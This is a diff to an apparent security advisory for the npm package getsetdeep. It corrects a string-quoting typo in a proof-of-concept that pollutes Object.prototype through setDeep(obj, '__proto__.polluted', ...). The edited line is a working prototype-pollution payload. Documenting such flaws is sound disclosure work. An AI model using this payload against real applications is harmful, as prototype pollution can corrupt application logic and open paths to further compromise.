@@ -13,7 +13,7 @@ This package fails to restrict access to prototypes of objects, allowing for mod
 var getsetdeep = require("getsetdeep")
 const obj = {}
 console.log("Before : " + {}.polluted);
-getsetdeep.setDeep(obj, '__proto__.polluted', 'Yes! It's Polluted')
+getsetdeep.setDeep(obj, '__proto__.polluted', 'Yes! Its Polluted');
 console.log("After : " + {}.polluted);
 ```
 2. Execute the following commands in another terminal:
